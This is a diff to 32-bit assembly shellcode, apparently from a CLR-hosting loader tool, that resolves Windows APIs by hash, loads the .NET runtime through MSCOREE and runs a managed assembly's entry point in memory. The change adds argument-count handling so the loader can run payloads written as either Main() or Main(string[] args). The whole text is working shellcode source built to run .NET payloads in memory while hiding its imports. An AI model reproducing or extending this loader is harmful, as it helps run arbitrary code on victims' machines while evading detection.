@@ -7,11 +7,13 @@ BITS 32
 ; clr_shellcode.py, but we're keeping it around just in case.
 
 OLEAUT32_HASH		                  equ 0x000d8c88
-OLEAUT32_NUMBER_OF_FUNCTIONS    	  equ 4
+OLEAUT32_NUMBER_OF_FUNCTIONS    	  equ 6
 OLEAUT32_SAFEARRAYCREATE_HASH 		  equ 0x006b5472
 OLEAUT32_SAFEARRAYCREATEVECTOR_HASH   equ 0x1ad55310
 OLEAUT32_SAFEARRAYACCESSDATA_HASH  	  equ 0x06b52e7a
 OLEAUT32_SAFEARRAYUNACCESSDATA_HASH	  equ 0x1ad6367a
+OLEAUT32_SAFEARRAYGETLBOUND_HASH	  equ 0x035aad58
+OLEAUT32_SAFEARRAYGETUBOUND_HASH	  equ 0x035aaf98
 
 KERNEL32_HASH 					equ 0x000d4e88
 KERNEL32_NUMBER_OF_FUNCTIONS	equ 2
@@ -191,16 +193,6 @@ geteip:
 	test eax,eax
 	jnz done
 
-	; pMethodArgs = _SafeArrayCreateVector(VT_VARIANT, 0, 1);
-	; if your main function has more than 1 argument, update that counter here
-	push byte 1
-	push byte 0
-	push byte 0x0c
-	call [OLEAUT32_SAFEARRAYCREATEVECTOR-geteip+ebx]
-	test eax,eax
-	jz done
-	mov [METHODARGS-geteip+ebx], eax
-
 	; pAssembly->get_EntryPoint(&pMethodInfo)
 	lea esi, [METHODINFO-geteip+ebx]
 	push esi
@@ -210,6 +202,56 @@ geteip:
 	call [ecx+0x40]
 	test eax,eax
 	jnz done
+
+	; pMethodInfo->GetParameters(&pMethodParams)
+	lea esi, [METHODPARAMS-geteip+ebx]
+	push esi
+	mov edx, [METHODINFO-geteip+ebx]
+	push edx
+	mov ecx, [edx]
+	call [ecx+0x48]
+	test eax,eax
+	jnz done
+
+	; SafeArrayGetLBound(pMethodParams, 1, &lLower);
+	lea esi, [LLOWER-geteip+ebx]
+	push esi
+	mov eax, 1
+	push eax
+	mov esi, [METHODPARAMS-geteip+ebx]
+	push esi
+	call [OLEAUT32_SAFEARRAYGETLBOUND-geteip+ebx]
+	test eax,eax
+	jnz done
+
+	; SafeArrayGetUBound(pMethodParams, 1, &lUpper);
+	lea esi, [LUPPER-geteip+ebx]
+	push esi
+	mov eax, 1
+	push eax
+	mov esi, [METHODPARAMS-geteip+ebx]
+	push esi
+	call [OLEAUT32_SAFEARRAYGETUBOUND-geteip+ebx]
+	test eax,eax
+	jnz done
+
+	;lArgs = (lUpper - lLower) + 1;
+	;support Main() and Main(string[] args)
+	mov eax, [LUPPER-geteip+ebx]
+	mov edx, [LLOWER-geteip+ebx]
+	sub eax, edx
+	add eax, 1
+	cmp eax, 1
+	jg done
+
+	; pMethodArgs = _SafeArrayCreateVector(VT_VARIANT, 0, 1);
+	push eax
+	push byte 0
+	push byte 0x0c
+	call [OLEAUT32_SAFEARRAYCREATEVECTOR-geteip+ebx]
+	test eax,eax
+	jz done
+	mov [METHODARGS-geteip+ebx], eax
 
 	; mMethodInfo->Invoke_3(obj, pMethodArgs, NULL);
 	; i assure you it doesn't care about the VARIANT and requires all these
@@ -256,6 +298,10 @@ SAFEARRAYDATA   dd 0x00000000
 CORASSEMBLY 	dd 0x00000000
 METHODARGS  	dd 0x00000000
 METHODINFO 		dd 0x00000000
+LUPPER          dd 0x00000000
+LLOWER          dd 0x00000000
+METHODPARAMS    dd 0x00000000
+LARGCOUNT       dd 0x00000000
 
 sabSafeArray:  RESB SAFEARRAYBOUND.size
 
@@ -270,6 +316,8 @@ OLEAUT32_HASHES_TABLE:
 	dd OLEAUT32_SAFEARRAYCREATEVECTOR_HASH
 	dd OLEAUT32_SAFEARRAYACCESSDATA_HASH
 	dd OLEAUT32_SAFEARRAYUNACCESSDATA_HASH
+	dd OLEAUT32_SAFEARRAYGETLBOUND_HASH
+	dd OLEAUT32_SAFEARRAYGETUBOUND_HASH
 
 MSCOREE_HASHES_TABLE:
 	dd MSCOREE_CLRCREATEINSTANCE_HASH
@@ -286,6 +334,8 @@ OLEAUT32_SAFEARRAYCREATE 		  dd 0x00000000
 OLEAUT32_SAFEARRAYCREATEVECTOR    dd 0x00000000
 OLEAUT32_SAFEARRAYACCESSDATA      dd 0x00000000
 OLEAUT32_SAFEARRAYUNACCESSDATA    dd 0x00000000
+OLEAUT32_SAFEARRAYGETLBOUND       dd 0x00000000
+OLEAUT32_SAFEARRAYGETUBOUND       dd 0x00000000
 
 MSCOREEDLL:
 	db "MSCOREE.dll", 0
